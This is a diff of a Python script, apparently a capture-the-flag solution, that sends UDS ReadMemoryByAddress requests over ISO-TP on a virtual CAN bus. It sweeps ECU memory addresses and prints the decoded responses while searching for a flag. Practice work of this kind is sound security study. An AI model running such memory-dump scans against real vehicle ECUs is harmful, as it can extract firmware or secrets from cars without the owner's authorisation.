@@ -1,8 +1,8 @@
 import subprocess
 import time
 
-Sender_target_canid = "7E0"
-Receiver_target_canid = "7E8"
+SENDER_CANID = "7E0"
+RECEIVER_CANID = "7E8"
 interface = "vcan0"
 
 def send_packet(input_bytes_int: list[int]):
@@ -10,11 +10,11 @@ def send_packet(input_bytes_int: list[int]):
     input_data = " ".join(input_bytes_str)
     
     # subprocess.callで標準入力を渡す
-    subprocess.run(['isotpsend', '-s', Sender_target_canid, '-d', Receiver_target_canid, interface], input=input_data.encode())
+    subprocess.run(['isotpsend', '-s', SENDER_CANID, '-d', RECEIVER_CANID, interface], input=input_data.encode())
 
 def create_background_recv_process():
     return subprocess.Popen(
-        ['isotprecv', '-s', Sender_target_canid, '-d', Receiver_target_canid, interface],
+        ['isotprecv', '-s', SENDER_CANID, '-d', RECEIVER_CANID, interface],
         stdout=subprocess.PIPE,
         stderr=subprocess.PIPE
     )
@@ -32,14 +32,12 @@ if __name__ == "__main__":
     
     process = create_background_recv_process()
     time.sleep(0.5)
-
-
-    for i in range(0x00, 0x12):
-        if (i%0x10)==0:
-            print(f"The {i} trial starts")
+    
+    # ISO TP
+    for i in range(0x00, 0xF):
+        time.sleep(0.5)
         
-        # ISO TP
-        packet = [0x23, 0x14, 0xC3, 0xF8, i, 0x00, 0xFF]
+        packet = [0x23, 0x14, 0xC0, 0xff, 0xe0 + i, 0x00, 0xFF]
 
         send_packet(packet)
 
@@ -47,16 +45,14 @@ if __name__ == "__main__":
             stdout, stderr = process.communicate()
             
             msg = stdout.decode("utf-8")
-            if stderr:
-                raise Exception(f"error has occured in {i}")
             
             response_msg = msg.split("\n")[0].strip()
             process = create_background_recv_process()
             time.sleep(0.1)
             
             target_msg = hex_to_ascii(response_msg[3:]).decode("utf-8")
-            if "flag" in target_msg:
-                print(target_msg)
+            # if "flag" in target_msg:
+            print(target_msg)
             
             
 
@@ -69,9 +65,9 @@ if __name__ == "__main__":
 
 
 
-    
 
 
-    
+
+
 
 
